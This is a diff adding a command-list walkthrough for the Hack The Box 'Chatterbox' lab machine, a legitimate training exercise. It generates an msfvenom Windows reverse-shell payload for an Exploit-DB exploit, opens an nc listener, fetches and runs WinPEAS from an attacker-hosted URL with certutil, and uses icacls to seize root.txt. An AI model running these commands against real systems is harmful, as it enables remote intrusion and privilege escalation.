@@ -1,0 +1,44 @@
+# ============================================================
+# HTB: Chatterbox Walkthrough
+# Video: https://youtu.be/-ZEye2_BNos
+# Machine: https://www.hackthebox.com/machines/chatterbox
+# ============================================================
+
+#############################################
+# 1️⃣ Exploitation – Chatterbox Service
+#############################################
+
+# Pull exploit from Exploit-DB
+searchsploit -m 36025
+
+# Generate a reverse shell payload with msfvenom
+msfvenom -a x86 --platform Windows \
+  -p windows/shell_reverse_tcp LHOST=<your_ip> LPORT=4444 \
+  -e x86/unicode_mixed -b '<HEX_FROM_PAYLOAD>' BufferRegister=EAX -f python
+
+# ⚠️ Replace:
+# - <HEX_FROM_PAYLOAD> with bad chars identified
+# - <your_ip> with VPN/tun0 address
+# - <target_ip> in exploit script before running
+
+# Start a listener
+nc -lvnp 4444
+
+
+#############################################
+# 2️⃣ Privilege Escalation – Windows
+#############################################
+
+# Transfer WinPEAS with certutil and run it
+certutil -urlcache -f http://<attacker_ip>:80/winPEASx86.exe file.exe
+.\file.exe
+
+# Observation: user has writable access inside Administrator folders
+
+
+#############################################
+# 3️⃣ Exploiting Weak File Permissions
+#############################################
+
+# Grant user 'alfred' full access to root.txt
+icacls root.txt /grant alfred:F
